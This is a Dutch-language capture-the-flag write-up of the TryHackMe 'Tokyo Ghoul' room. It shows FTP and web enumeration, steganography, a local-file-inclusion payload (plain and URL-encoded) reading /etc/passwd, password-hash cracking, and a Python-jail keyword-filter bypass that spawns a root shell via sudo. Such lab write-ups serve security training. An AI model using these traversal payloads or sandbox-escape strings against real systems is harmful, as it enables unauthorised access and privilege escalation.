---
title: "Try Hack Me - Tokyo Ghoul"
author: Nicolas Bouquiaux
date: "2021-03-28"
subject: "Markdown"
keywords: [Markdown, Example]
lang: "nl"
...

# Tokyo Ghoul - Write-up

## Target information

* IP: 10.10.213.28
* 

## Enumeration

nmap geeft volgende output over onze target:

```shell
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-28 01:29 EDT
Nmap scan report for 10.10.213.28
Host is up (0.035s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Jan 23 22:26 need_Help?
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.0.187
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh
| ssh-hostkey: 
|   2048 fa:9e:38:d3:95:df:55:ea:14:c9:49:d8:0a:61:db:5e (RSA)
|   256 ad:b7:a7:5e:36:cb:32:a0:90:90:8e:0b:98:30:8a:97 (ECDSA)
|_  256 a2:a2:c8:14:96:c5:20:68:85:e5:41:d0:aa:53:8b:bd (ED25519)
80/tcp open  http
|_http-title: Welcome To Tokyo goul

Nmap done: 1 IP address (1 host up) scanned in 4.66 seconds
```

Dus 3 poorten staan open: poort 21 (ftp), 22 (ssh) en 80 (http)


## Directory-listing / Web-enumeration

Gobuster heeft 2 index.html files gevonden

```shell
┌──(root💀kali)-[~/CTF-Write-Ups/TokyoGhoul]
└─# gobuster dir -u http://10.10.213.28/ -w /usr/share/wordlists/dirb/common.txt -x php,html  
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.213.28/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
2021/03/28 01:38:25 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.hta.html            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/css                  (Status: 301) [Size: 310] [--> http://10.10.213.28/css/]
/index.html           (Status: 200) [Size: 1414]                              
/index.html           (Status: 200) [Size: 1414]                              
/server-status        (Status: 403) [Size: 277]                               
                                                                              
===============================================================
2021/03/28 01:39:14 Finished
===============================================================
```

## HTTP

De website vertelt het verhaale over een anime-jongen:

[](./Images/Screen_Web-enum.png)


## FTP

De poortscan liet ons weten dat anonieme-login toegestaan is:

```shell
┌──(root💀kali)-[~]
└─# ftp 10.10.169.251
Connected to 10.10.169.251.
220 (vsFTPd 3.0.3)
Name (10.10.169.251:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jan 23 22:26 need_Help?
226 Directory send OK.
ftp> cd need_Help?
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           480 Jan 23 22:26 Aogiri_tree.txt
drwxr-xr-x    2 ftp      ftp          4096 Jan 23 22:26 Talk_with_me
226 Directory send OK.
ftp> cd Talk_with_me
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xr-x    1 ftp      ftp         17488 Jan 23 22:26 need_to_talk
-rw-r--r--    1 ftp      ftp         46674 Jan 23 22:26 rize_and_kaneki.jpg
226 Directory send OK.
ftp> 
```

Zo te zien zijn er 3 bestanden dat ik op mijn machine kan downloaden:

* need_to_talk
* rize_and_kaneki.jpg
* Aogiri_tree.txt


## File analysis

```text
FILE: Aogiri_tree.txt

Why are you so late?? i've been waiting for too long .
So i heard you need help to defeat Jason , so i'll help you to do it and i know you are wondering how i will. 
I knew Rize San more than anyone and she is a part of you, right?
That mean you got her kagune , so you should activate her Kagune and to do that you should get all control to your body , i'll help you to know Rise san more and get her kagune , and don't forget you are now a part of the Aogiri tree .
Bye Kaneki.
```

[](./Images/rize_and_kaneki.jpg)

```shell
┌──(root💀kali)-[~/CTF-Write-Ups/TokyoGhoul/Images]
└─# file ../Files/need_to_talk 
../Files/need_to_talk: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=adba55165982c79dd348a1b03c32d55e15e95cf6, for GNU/Linux 3.2.0, not stripped
```

het strings-commando kan ons wat duidelijkheid brengen over wat het programma doet:

```shell
┌──(root💀kali)-[~/CTF-Write-Ups/TokyoGhoul]
└─# strings Files/need_to_talk 
/lib64/ld-linux-x86-64.so.2
mgUa
puts
putchar
stdin
printf
fgets
strlen
stdout
malloc
usleep
__cxa_finalize
setbuf
strcmp
__libc_start_main
free
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
You_founH
d_1t
[]A\A]A^A_
kamishiro
Hey Kaneki finnaly you want to talk 
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I'm looking for?
Good job. I believe this is what you came for:
Hmm. I don't think this is what I was looking for.
Take a look inside of me. rabin2 -z
;*3$"
```

Dus het programma is een simpele console applicatie dat iets vraagt aan de user, die terug te vinden was in de binary.

```shell
┌──(root💀kali)-[~/CTF-Write-Ups/TokyoGhoul/Images]
└─# steghide extract -sf rize_and_kaneki.jpg                                                1 ⨯
Enter passphrase: 
wrote extracted data to "yougotme.txt".

..... .-
....- ....-
....- -....
--... ----.
....- -..
...-- ..---
....- -..
...-- ...--
....- -..
....- ---..
....- .-
...-- .....
..... ---..
...-- ..---
....- .
-.... -.-.
-.... ..---
-.... .
..... ..---
-.... -.-.
-.... ...--
-.... --...
...-- -..
...-- -..
```

In de afbeelding zit dus een soort morsecode-bericht in verwerkt. Cyberchef is hier de oplossing voor:

[](./Images/screen-cyberchef.png)

Dat wijst erop dat het een folder op de website is, maar de webpagina heeft geen nuttige informatie:

[](./Images/screen-decodedfolder.png)

Gobuster opnieuwe uitvoeren op de webserver maar dan vertrekkende vanuit de folder die we uit cyberchef kregen, levert ons nog een verborgen folder op:

```shell
┌──(root💀kali)-[~/CTF-Write-Ups/TokyoGhoul/Images]
└─# gobuster dir -u http://10.10.169.251/d1r3c70ry_center/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.169.251/d1r3c70ry_center/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/03/28 04:28:18 Starting gobuster in directory enumeration mode
===============================================================
/claim                (Status: 301) [Size: 331] [--> http://10.10.169.251/d1r3c70ry_center/claim/]
```

[](./Images/screen-claimsite.png)

Op 'Yes' of 'no' klikken verwijst ons door naar /index.php?view=flower.gif

Daar zou een lfi toch zeer goed zijn werk mee kunnen doen: ../../../../../../..//etc/passwd

[](./Images/screen-lfiexploit.png)

Wel dan spring geljk maar over naar het URL encoden van de lfi:

```text
%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Fetc%2Fpasswd
```

[](./Images/screen-lfisucces.png)

Wachtwoordhashes... Dat betekent dat we JTR (John The Ripper) kunnen gebruiken voor het kraken van de hashes

```shell
──(root💀kali)-[~/CTF-Write-Ups/TokyoGhoul]
└─# john hash --wordlist=/home/kali/Desktop/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)
1g 0:00:00:00 DONE (2021-03-28 04:54) 1.176g/s 1807p/s 1807c/s 1807C/s cuties..mexico1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## Privelege Escelation

We kunnen nu een SSH-verbinding maken met de gegevens die we zonet hebben gekregen:

```shell
kamishiro@vagrant:~$ sudo -l
[sudo] password for kamishiro: 
Matching Defaults entries for kamishiro on vagrant.vm:
    env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kamishiro may run the following commands on vagrant.vm:
    (ALL) /usr/bin/python3 /home/kamishiro/jail.py
kamishiro@vagrant:~$ 
```

Het blijkt dus dat we geen schrijfrechten hebben in de /home/... directory, dus we kunnen het script niet aanpassen.

Eens kijken hoe dat script in elkaar steekt:

```shell
#! /usr/bin/python3
#-*- coding:utf-8 -*-
def main():
    print("Hi! Welcome to my world kaneki")
    print("========================================================================")
    print("What ? You gonna stand like a chicken ? fight me Kaneki")
    text = input('>>> ')
    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
        if keyword in text:
            print("Do you think i will let you do this ??????")
            return;
    else:
        exec(text)
        print('No Kaneki you are so dead')
if __name__ == "__main__":
    main()
```

Dus het komt erop neer dat we geen normale woorden kunnen gebruiken. Dus moet het maar volgens escaping-methodes.


Dus geef ik alles behalve text in als het script mij voor input vraagt:

```shell
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /root/root.txt')
```

```shell
kamishiro@vagrant:~$ jail.py 
-bash: jail.py: command not found
kamishiro@vagrant:~$ ./jail.py 
-bash: ./jail.py: Permission denied
kamishiro@vagrant:~$ sudo /usr/bin/python3 /home/kamishiro/jail.py 
Hi! Welcome to my world kaneki
========================================================================
What ? You gonna stand like a chicken ? fight me Kaneki
>>> __builtins__.__dict__['__IMPORT__'.lower()]('PTY'.lower()).__dict__['SPAWN'.lower()]('/bin/bash')
root@vagrant:~# cat /root/root.txt 
9d790bb87898ca66f724ab05a9e6000b
root@vagrant:~# 
```

